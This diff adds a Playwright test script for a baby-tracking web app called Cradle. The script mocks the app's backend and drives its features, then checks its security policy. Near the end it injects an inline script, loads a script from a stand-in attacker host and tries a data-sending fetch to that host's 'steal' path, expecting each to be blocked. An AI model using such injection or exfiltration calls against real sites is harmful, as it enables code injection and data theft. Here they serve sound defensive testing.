@@ -1,0 +1,46 @@
+import { chromium } from 'playwright';
+const b=await chromium.launch({executablePath:process.env.CHROME_PATH||undefined});
+const viol=[],errs=[];
+const ctx=await b.newContext({viewport:{width:390,height:844},acceptDownloads:true,userAgent:'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Mobile Safari/537.36'});
+const p=await ctx.newPage();
+p.on('console',m=>{const t=m.text();if(/Content Security Policy|Refused to/i.test(t))viol.push(t.slice(0,200))});p.on('pageerror',e=>errs.push(e.message));
+await p.addInitScript(()=>{document.addEventListener('securitypolicyviolation',e=>{(window.__v=window.__v||[]).push(e.violatedDirective+' '+e.blockedURI)})});
+const H={'access-control-allow-origin':'*','access-control-allow-headers':'*','access-control-allow-methods':'*'};
+const FAM={household:'h1',name:"Juniper's family",join_code:'K7QM-4XPD',role:'member',members:[{user_id:'u0',email:'owner@example.com',role:'owner',me:false},{user_id:'u1',email:'sam@example.com',role:'member',me:true}],invites:[],claimed:false};
+let posted=0;
+await ctx.route('https://demo.supabase.co/**',r=>{const u=r.request().url(),m=r.request().method();if(m==='OPTIONS')return r.fulfill({status:204,headers:H});
+  if(u.includes('/auth/v1/token'))return r.fulfill({status:200,headers:H,contentType:'application/json',body:JSON.stringify({access_token:'a',refresh_token:'r',expires_in:3600,user:{id:'u1',email:'sam@example.com'}})});
+  if(u.includes('/auth/v1/logout'))return r.fulfill({status:204,headers:H});
+  if(u.includes('/rpc/cradle_scores_board'))return r.fulfill({status:200,headers:H,contentType:'application/json',body:JSON.stringify({initials:'SAM',everyone:[],family:[],mine:[],rank:1,players:0})});
+  if(u.includes('/rpc/'))return r.fulfill({status:200,headers:H,contentType:'application/json',body:JSON.stringify(FAM)});
+  if(m==='GET')return r.fulfill({status:200,headers:H,contentType:'application/json',body:'[]'});
+  posted++;return r.fulfill({status:201,headers:H,body:''})});
+const ok=(n,c,x='')=>console.log((c?'PASS':'FAIL')+'  '+n+(x?'  | '+x:''));
+await p.goto('http://localhost:8099/');await p.waitForSelector('#gLogin:not(.hidden)',{timeout:8000});
+ok('app boots under the security policy (sign-in shown)',true);
+ok('database fields hidden (baked config)',await p.isHidden('#gUrl'));
+await p.fill('#gUser','sam@example.com');await p.fill('#gPass','longenough1');await p.click('#gGo');await p.waitForTimeout(2500);
+await p.evaluate(()=>document.querySelectorAll('.modal.open').forEach(m=>m.classList.remove('open')));
+ok('signed in and synced through the allowed connection',!(await p.isVisible('#gate.open')));
+await p.click('#logNow');await p.click('#addBath');await p.waitForTimeout(1500);ok('entries upload (connect-src works)',posted>0,posted+' uploads');
+for(const t of ['dash','hist','today']){await p.click(`#tabs [data-tab=${t}]`);await p.waitForTimeout(300)}
+await p.click('.chartbox >> nth=0').catch(()=>{});await p.waitForTimeout(300);await p.evaluate(()=>document.querySelectorAll('.modal.open').forEach(m=>m.classList.remove('open')));
+await p.click('#tabs [data-tab=night]');await p.waitForTimeout(400);await p.click('[data-n=exit]').catch(()=>p.click('[data-n=exit2]'));
+await p.click('#calmBtn');await p.waitForTimeout(400);await p.mouse.click(200,400);await p.click('#calm [data-snd=spa]').catch(()=>{});await p.waitForTimeout(300);await p.keyboard.press('Escape');
+await p.click('#menuBtn');await p.click('[data-act=themes]');await p.click('#themeModal [data-theme=dalmatian]');await p.waitForTimeout(300);await p.evaluate(()=>document.querySelectorAll('.modal.open').forEach(m=>m.classList.remove('open')));
+await p.click('#menuBtn');await p.click('[data-act=learn]');await p.click('#lcGrid [data-hci="3"]');await p.waitForTimeout(300);await p.click('#hc [data-hc=close]');await p.evaluate(()=>document.querySelectorAll('.modal.open').forEach(m=>m.classList.remove('open')));
+await p.click('#menuBtn');await p.click('[data-act=fun]');await p.click('#funPlay');await p.click('#gPanel [data-g=play]');await p.mouse.move(195,600);await p.mouse.down();await p.waitForTimeout(2500);await p.mouse.up();await p.click('#gHud [data-g=pause]');await p.click('#gPanel [data-g=quit]');await p.waitForTimeout(500);await p.click('#gPanel [data-g=board]');await p.waitForTimeout(600);await p.keyboard.press('Escape');await p.keyboard.press('Escape');
+await p.evaluate(()=>document.querySelectorAll('.modal.open').forEach(m=>m.classList.remove('open')));
+await p.click('#menuBtn');await p.click('[data-act=data]');await p.click('[data-dm=export]');await p.waitForTimeout(400);const [dl]=await Promise.all([p.waitForEvent('download',{timeout:5000}),p.click('text=Download file')]);ok('backup download works',!!dl);
+ok('service worker registered',await p.evaluate(async()=>!!(await navigator.serviceWorker.getRegistration())));
+const v=await p.evaluate(()=>window.__v||[]);ok('no security-policy violations from Cradle itself',v.length===0&&viol.length===0,(v.concat(viol)).join(' || '));
+// an injected script must be blocked
+await p.evaluate(()=>{const s=document.createElement('script');s.textContent='window.__pwned=1';document.body.appendChild(s)});
+await p.waitForTimeout(200);ok('injected inline script is blocked',await p.evaluate(()=>window.__pwned===undefined),(await p.evaluate(()=>(window.__v||[]).join(','))));
+await p.evaluate(()=>{const s=document.createElement('script');s.src='https://evil.example.com/x.js';document.body.appendChild(s)});await p.waitForTimeout(300);
+ok('scripts from other sites are blocked',(await p.evaluate(()=>(window.__v||[]).some(x=>/evil\.example/.test(x)))));
+const r=await p.evaluate(async()=>{try{await fetch('https://evil.example.com/steal',{method:'POST',body:'x'});return 'sent'}catch(e){return 'blocked'}});ok('sending data to other sites is blocked',r==='blocked');
+// cannot be framed
+const f=await b.newPage();await f.setContent('<iframe src="http://localhost:8099/" id="f"></iframe>');await f.waitForTimeout(1500);
+ok('page refuses to load inside another site’s frame',await f.evaluate(()=>{try{return !document.getElementById('f').contentDocument||!document.getElementById('f').contentDocument.querySelector('#gate')}catch(e){return true}}));
+console.log('errors',errs);await b.close();
